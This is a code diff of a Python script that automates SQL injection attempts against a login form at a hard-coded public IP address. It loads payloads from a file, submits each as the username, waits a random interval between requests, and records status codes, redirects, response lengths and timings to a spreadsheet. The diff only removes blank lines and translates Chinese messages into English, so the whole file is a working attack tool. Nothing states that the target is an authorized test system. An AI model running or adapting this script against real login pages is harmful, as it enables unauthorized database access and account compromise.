@@ -7,25 +7,13 @@ import pandas as pd
 
 
 URL = "http://120.77.14.42:8081/doLogin"
-
-
 PAYLOAD_FILE = "sql_injection_payload.txt"
-
 FIXED_PASSWORD = "test"
-
-
 OUTPUT_EXCEL = "sql_injection_results.xlsx"
-
 REQUEST_TIMEOUT = 5
-
-
 DELAY_MIN = 0.3
 DELAY_MAX = 1.2
-
 PROXIES = None
-
-
-
 # ================== 功能函数 ==================
 
 def load_payloads(file_path: str):
@@ -36,16 +24,12 @@ def load_payloads(file_path: str):
             if payload != "":
                 payloads.append(payload)
     return payloads
-
-
 def test_login(username_payload: str) -> dict:
     session = requests.Session()
-
     data = {
         "username": username_payload,
         "password": FIXED_PASSWORD,
     }
-
     try:
         resp = session.post(
             URL,
@@ -68,7 +52,6 @@ def test_login(username_payload: str) -> dict:
         print(f"[!] 请求失败: {repr(username_payload)}")
         print(f"    错误: {e}")
         return info
-
     info = {
         "payload": username_payload,
         "status_code": resp.status_code,
@@ -78,37 +61,27 @@ def test_login(username_payload: str) -> dict:
         "error": "",
         "time": time.strftime("%Y-%m-%d %H:%M:%S"),
     }
-
     print("=" * 60)
     print(f"[+] Payload: {repr(username_payload)}")
     print(f"    状态码:        {info['status_code']}")
     print(f"    Location:      {info['location']}")
     print(f"    响应长度:      {info['response_length']}")
     print(f"    响应时间:      {info['elapsed_seconds']:.3f} s")
-
     return info
-
-
 # ================== 主流程 ==================
-
 def main():
-    # 1. 读取 payload
     payloads = load_payloads(PAYLOAD_FILE)
-    print(f"[+] 共加载 {len(payloads)} 条 payload\n")
-
+    print(f"[+] A total of {len(payloads)} payloads were loaded\n")
     results = []
-
     for i, p in enumerate(payloads, start=1):
-        print(f"\n[*] ({i}/{len(payloads)}) 测试中...")
+        print(f"\n[*] ({i}/{len(payloads)}) testing...")
         info = test_login(p)
         results.append(info)
         delay = random.uniform(DELAY_MIN, DELAY_MAX)
         time.sleep(delay)
-
     df = pd.DataFrame(results)
     df.to_excel(OUTPUT_EXCEL, index=False)
-    print(f"\n[+] 所有结果已保存到: {OUTPUT_EXCEL}")
-
+    print(f"\n[+] All results have been saved to: {OUTPUT_EXCEL}")
 
 if __name__ == "__main__":
     main()
